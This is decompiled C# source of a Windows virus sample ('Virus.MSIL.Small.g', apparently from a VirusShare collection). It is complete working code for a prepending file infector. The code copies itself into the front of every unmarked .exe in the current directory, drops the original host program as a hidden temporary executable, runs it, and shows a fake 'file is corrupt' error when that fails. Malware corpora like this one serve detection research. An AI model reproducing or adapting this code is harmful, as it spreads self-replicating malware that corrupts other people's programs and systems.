// Decompiled with JetBrains decompiler
// Type: nemo.Module1
// Assembly: nemo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2D9B0A6D-192E-4D73-A06F-ACACE5271DF2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Virus.MSIL.Small.g-992d8d07b3cfb9a39db36df36667d41467ea9ad1dac69c419c3c4c4cf5c37665.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace nemo
{
  [StandardModule]
  internal sealed class Module1
  {
    public static void Replicate()
    {
      string str = Conversions.ToString(new Random().Next(1, 1000)) + ".exe";
      object obj = (object) Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
      string currentDirectory = Environment.CurrentDirectory;
      FileStream input1 = new FileStream(Conversions.ToString(obj), FileMode.Open, FileAccess.Read);
      BinaryReader binaryReader1 = new BinaryReader((Stream) input1);
      byte[] numArray1 = new byte[checked ((int) input1.Length + 1)];
      int num1 = checked ((int) (binaryReader1.BaseStream.Length - 1L));
      int index1 = 0;
      while (index1 <= num1)
      {
        numArray1[index1] = binaryReader1.ReadByte();
        checked { ++index1; }
      }
      input1.Close();
      binaryReader1.Close();
      string[] files = Directory.GetFiles(currentDirectory, "*.exe");
      int num2 = checked (files.Length - 1);
      int index2 = 0;
      while (index2 <= num2)
      {
        FileStream input2 = new FileStream(files[index2], FileMode.Open, FileAccess.Read);
        BinaryReader binaryReader2 = new BinaryReader((Stream) input2);
        byte[] numArray2 = new byte[checked ((int) input2.Length + 1)];
        int num3 = checked ((int) (binaryReader2.BaseStream.Length - 1L));
        int index3 = 0;
        while (index3 <= num3)
        {
          numArray2[index3] = binaryReader2.ReadByte();
          checked { ++index3; }
        }
        input2.Close();
        binaryReader2.Close();
        if (numArray2[60] != (byte) 128)
        {
          Console.WriteLine("File to infect:" + files[index2]);
          FileStream output = new FileStream(files[index2], FileMode.Open, FileAccess.Write);
          BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
          int num4 = checked (numArray1.Length - 1);
          int index4 = 0;
          while (index4 <= num4)
          {
            binaryWriter.BaseStream.WriteByte(numArray1[index4]);
            checked { ++index4; }
          }
          int num5 = checked (numArray2.Length - 1);
          int index5 = 0;
          while (index5 <= num5)
          {
            binaryWriter.BaseStream.WriteByte(numArray2[index5]);
            checked { ++index5; }
          }
          binaryWriter.Close();
          output.Close();
        }
        checked { ++index2; }
      }
      FileInfo fileInfo = new FileInfo(Conversions.ToString(obj));
      int num6 = new int();
      if (checked ((int) (fileInfo.Length - 28673L)) <= 0)
        return;
      if (File.Exists(str))
        File.Delete(str);
      FileStream fileStream = new FileStream(str, FileMode.CreateNew);
      File.SetAttributes(str, FileAttributes.Hidden);
      int length = checked ((int) fileInfo.Length);
      int index6 = 28673;
      while (index6 <= length)
      {
        fileStream.WriteByte(numArray1[index6]);
        checked { ++index6; }
      }
      fileStream.Close();
      try
      {
        Process.Start(str).WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num7 = (int) MessageBox.Show("This file is corrupt", "Windows", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        ProjectData.ClearProjectError();
      }
      File.Delete(str);
    }

    [STAThread]
    public static void Main() => Module1.Replicate();
  }
}
